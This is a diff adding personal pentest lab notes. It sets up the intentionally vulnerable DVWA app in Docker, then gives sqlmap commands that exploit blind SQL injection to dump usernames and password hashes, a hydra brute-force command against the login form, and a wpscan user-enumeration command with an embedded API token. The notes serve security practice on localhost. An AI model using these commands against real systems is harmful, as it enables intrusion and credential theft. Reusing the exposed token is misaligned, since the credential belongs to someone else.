@@ -1,3 +1,44 @@
+<Docker wizardy>
+
+1. Hello dockah
+docker run hello-world
+
+2. Docker compose spelling
+
+3. Install DVWA
+docker pull vulnerables/web-dvwa
+
+4. Run DVWA @ port 666
+docker run --rm -it -p 666:80 vulnerables/web-dvwa
+
+<sqlmap>
+
+1. Blind sql injection:
+
+show all available databases:
+python3 sqlmap.py -u "http://localhost:666/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=" --dbs
+
+Show all tables on selected DB:
+python3 sqlmap.py -u "http://localhost:666/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=" -D dvwa --tables
+
+Explain `users` table
+python3 sqlmap.py -u "http://localhost:666/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=6aefs3p3f19t9e2upe0oih4mk5" -D dvwa --tables
+
+List of all users
+python3 sqlmap.py -u "http://localhost:666/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=6aefs3p3f19t9e2upe0oih4mk5" -C user,password --dump
+
+Show result (user, hash, decrypted)
+vim ~/.sqlmap/output/localhost/dump/dvwa/users.csv
+
+<DVWA>
+
+1. BruteForce
+
+hydra -l admin -P ../dictionary.txt -d localhost -s 666 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID=6aefs3p3f19t9e2upe0oih4mk5; security=low" -d -o hydra-shitup.txt 
+
+
+
+
 Scan local WP instance
 
 wpscan --url http://localhost/ --enumerate u --api-token DMmsAXJ7zykVUUV57htIm3HbVxmmgtaj4T4mQWEUaPo
